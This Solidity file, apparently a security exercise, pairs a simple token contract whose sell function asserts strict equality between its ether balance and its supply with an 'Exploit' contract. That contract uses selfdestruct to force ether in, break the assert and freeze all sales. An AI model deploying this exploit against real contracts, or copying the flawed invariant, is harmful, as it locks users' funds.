// SPDX-License-Identifier: MIT


pragma solidity 0.8.17;

contract  hero2303
 {
    mapping (address => uint256) private userBalances;

    uint256 public constant TOKEN_PRICE = 1 ether;
    string public constant name = "UNDIVTOK";
    string public constant symbol = "UDK";
    
    uint8 public constant decimals = 0;

    uint256 public totalSupply;

    function buy(uint256 _amount) external payable {
        require(
            msg.value == _amount * TOKEN_PRICE, 
            "Ether submitted and Token amount to buy mismatch"
        );

        userBalances[msg.sender] += _amount;
        totalSupply += _amount;
    }

    function sell(uint256 _amount) external {
        require(userBalances[msg.sender] >= _amount, "Insufficient balance");

        userBalances[msg.sender] -= _amount;
        totalSupply -= _amount;

        (bool success, ) = msg.sender.call{value: _amount * TOKEN_PRICE}("");
        require(success, "Failed to send Ether");

        assert(getEtherBalance() == totalSupply * TOKEN_PRICE);
    }

    function transfer(address _to, uint256 _amount) external {
        require(_to != address(0), "_to address is not valid");
        require(userBalances[msg.sender] >= _amount, "Insufficient balance");
        
        userBalances[msg.sender] -= _amount;
        userBalances[_to] += _amount;
    }

    function getEtherBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getUserBalance(address _user) external view returns (uint256) {
        return userBalances[_user];
    }
}


contract Exploit {
    address payable addr;

    constructor(address payable a) payable {
        selfdestruct(a);
    }
}